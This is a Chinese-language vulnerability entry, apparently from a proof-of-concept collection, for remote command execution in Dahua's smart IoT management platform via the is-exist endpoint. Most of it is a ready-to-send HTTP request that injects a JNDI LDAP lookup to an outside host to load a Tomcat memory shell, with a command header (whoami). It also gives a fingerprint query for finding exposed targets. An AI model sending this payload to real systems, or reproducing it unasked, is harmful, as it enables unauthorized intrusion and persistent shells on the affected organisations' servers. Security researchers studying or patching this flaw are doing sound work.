﻿# 大华智能物联综合管理平台 is-exist 命令执行漏洞

> 更新时间：2024-05-07

> 漏洞编号：

> 漏洞说明：智能物联综合管理平台 is-exist 接口处存在远命令执行漏洞，使得攻击者可以通过构造特定的请求远程执行恶意代码。此漏洞可能导致攻击者获取系统权限、执行任意命令，严重威胁系统的机密性和完整性。

> 漏洞特征：body="*客户端会小于800*" || body="/static/fontshd/font-hd.css"

> 验证脚本：HTTP

```
POST /evo-apigw/evo-brm/1.2.0/user/is-exist HTTP/1.1
Connection: close
Accept: application/json, text/plain, /
Accept-Encoding: gzip
Accept-Language: zh-CN
Authorization: 
Content-Type: application/json;charset=utf-8
Referer: ${jndi:ldap://www.baidu.com/Basic/TomcatMemshell3}
Timeoffset: -28800000
User-Client: 1
cmd: whoami

{"loginName":"${jndi:ldap://www.baidu.com/Basic/TomcatMemshell3}"}
```

> 响应代码特征：406

> 响应内容特征：

> 上传文件定位：

> 验证文件来源：大华智能物联综合管理平台 is-exist 命令执行漏洞.poc

